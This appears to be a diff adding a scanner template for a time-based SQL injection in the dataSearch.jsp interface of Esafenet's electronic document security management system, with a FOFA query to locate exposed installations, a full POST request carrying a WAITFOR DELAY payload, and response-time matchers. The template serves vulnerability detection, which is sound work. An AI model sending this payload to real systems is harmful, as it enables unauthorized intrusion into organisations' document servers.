@@ -1,0 +1,27 @@
+## id: VEID-2024-0302
+## name: 亿赛通电子文档安全管理系统接口dataSearch.jsp存在SQL注入
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: 亿赛通电子文档存在SQL注入
+## fofa-query: app="亿赛通-电子文档安全管理系统"
+## verification: true
+
+
+POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+id=1';WAITFOR+DELAY+'0:0:7'--
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+
+
+
+
+
+# @VEIL-STAMP: af981b707612ded4689465c600cd25546db8e9ba070bdebaa9c98bad920ca88b
